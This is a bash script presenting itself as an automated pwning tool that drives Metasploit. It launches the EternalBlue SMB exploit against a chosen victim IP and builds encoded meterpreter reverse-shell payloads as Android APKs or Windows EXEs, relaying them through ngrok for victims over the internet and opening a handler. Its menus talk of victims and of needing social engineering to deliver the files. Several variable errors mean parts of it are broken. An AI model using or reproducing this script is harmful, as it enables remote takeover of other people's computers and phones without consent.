#!/bin/bash
resize -s 17 82; choice() { echo $'Now choose your victim`s OS\n Press 1 for android\nor\nPress 2 for windows';read os; }; create() { echo 'payload $payload created successfully in';pwd;sleep 2;echo 'starting the $payload handler.....'; } ;clear;tput setaf 172;tput bold;echo '                   -= Built with <3 by RK   =-';tput sgr0;tput setaf 9;echo $'   ▄████████ ███    █▄      ███      ▄██████▄     ▄███████▄  ▄█     █▄  ███▄▄▄▄   \n  ███    ███ ███    ███ ▀█████████▄ ███    ███   ███    ███ ███     ███ ███▀▀▀██▄ \n  ███    ███ ███    ███    ▀███▀▀██ ███    ███   ███    ███ ███     ███ ███   ███ \n  ███    ███ ███    ███     ███   ▀ ███    ███   ███    ███ ███     ███ ███   ███ \n▀███████████ ███    ███     ███     ███    ███ ▀█████████▀  ███     ███ ███   ███ \n  ███    ███ ███    ███     ███     ███    ███   ███        ███     ███ ███   ███ \n  ███    ███ ███    ███     ███     ███    ███   ███        ███     ███ ███   ███ \n  ███    ███ ███    ███     ███     ███    ███   ███        ███ ▄█▄ ███ ███   ███ \n  ███    █▀  ████████▀     ▄████▀    ▀██████▀   ▄████▀       ▀███▀███▀   ▀█   █▀  ';tput sgr0;tput setaf 190;tput bold;echo $'\n 		             An automated pwning tool\n';tput sgr0;echo 'What type of attack would you like to do?(Press Ctrl + C to exit!)';tput setaf = 6; tput bold;echo 'Press 1 for Eternal Blue!';tput bold;tput setaf 5;echo 'Press 2 for the regular meterpreter payload attack!';tput sgr0;read type; if [[ type -eq '1' ]]; then tput setaf 9;tput bold;echo 'This attack only works on windows, (till Windows 7!) ';tput sgr0;echo 'MAKE SURE THE VICTIM IS ON THE SAME NETWORK!!';echo 'Enter the victim`s IP address'; read vip ; echo 'Enter your local IP address' ; read lip ; echo "Attacking $vip ..." ;msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST $vip; set LHOST $lip ; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit" ; elif [[ type -eq '2' ]]; then clear; resize -s 18 82; tput setaf 172;tput bold; echo '                   -= Built with <3 by PRANSHU RANAKOTI  ©2018 =-';tput sgr0;tput setaf 9;echo $'   ▄████████ ███    █▄      ███      ▄██████▄     ▄███████▄  ▄█     █▄  ███▄▄▄▄   \n  ███    ███ ███    ███ ▀█████████▄ ███    ███   ███    ███ ███     ███ ███▀▀▀██▄ \n  ███    ███ ███    ███    ▀███▀▀██ ███    ███   ███    ███ ███     ███ ███   ███ \n  ███    ███ ███    ███     ███   ▀ ███    ███   ███    ███ ███     ███ ███   ███ \n▀███████████ ███    ███     ███     ███    ███ ▀█████████▀  ███     ███ ███   ███ \n  ███    ███ ███    ███     ███     ███    ███   ███        ███     ███ ███   ███ \n  ███    ███ ███    ███     ███     ███    ███   ███        ███     ███ ███   ███ \n  ███    ███ ███    ███     ███     ███    ███   ███        ███ ▄█▄ ███ ███   ███ \n  ███    █▀  ████████▀     ▄████▀    ▀██████▀   ▄████▀       ▀███▀███▀   ▀█   █▀  ';tput sgr0;tput setaf 190;tput bold;echo $'\n 		             An automated pwning tool';tput sgr0;tput setaf 172;tput bold;echo $'\n        ---------You need some Social Engineering skills for this !------------\n'; tput sgr0; tput setaf 6; tput bold; echo 'Press 1 for WAN (over the internet)'; tput bold;tput setaf 5; echo 'Press 2 for LAN (On the same network)'; tput sgr0; read attack; if [[ $attack -eq "1" ]]; then echo $'start ngrok on your device, by opening\na new window in the terminal \nand type "ngrok tcp 4444" then,\nnote down the port number after tcp://0.ngrok.tcp.io:"<port>"\nand paste it below'; read pport; echo 'name of the desired file'; read wname; choice; if [[ os -eq '1' ]]; then msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST="0.tcp.ngrok.io" LPORT=$pport R > $wname.apk; create; msfconsole -q -x 'use exploit/multi/handler;set LHOST 0.0.0.0; set LPORT 4444;set PAYLOAD android/meterpreter/reverse_tcp;exploit'; elif [[ os -eq '2' ]]; then msfvenom -p windows/meterpreter/reverse_tcp LHOST="0.tcp.ngrok.io" LPORT="$port" -f exe -e x86/shikata_ga_nai -i 30 > $wname.exe; create; msfconsole -q -x 'use exploit/multi/handler;set LHOST 0.0.0.0; set LPORT 4444;set PAYLOAD windows/meterpreter/reverse_tcp;exploit'; else echo $'\nOops, wrong choice!, try again...\n'; choice; fi ; elif [[ attack -eq '2' ]]; then	echo 'Enter your machine`s local ip adress'; read ipad; echo 'name of the desired file'; read lname; choice; if [[ os -eq 1 ]]; then msfvenom --platform android -p android/meterpreter/reverse_tcp $ipad 4444 R > $lname.apk ; create; msfconsole -q -x 'use exploit/multi/handler;set LHOST $ipad; set LPORT 4444;set PAYLOAD $payload;exploit'; elif [[ os -eq 2 ]]; then msfvenom -p windows/meterpreter/reverse_tcp $ipad 4444 -f exe -e x86/shikata_ga_nai -i 30 > $lname.exe; create; msfconsole -q -x 'use exploit/multi/handler;set LHOST $ipad; set LPORT 4444;set PAYLOAD $payload;exploit'; else echo $'\nOops, wrong choice!, try again...\n'; choice; fi ;else exit; fi; fi
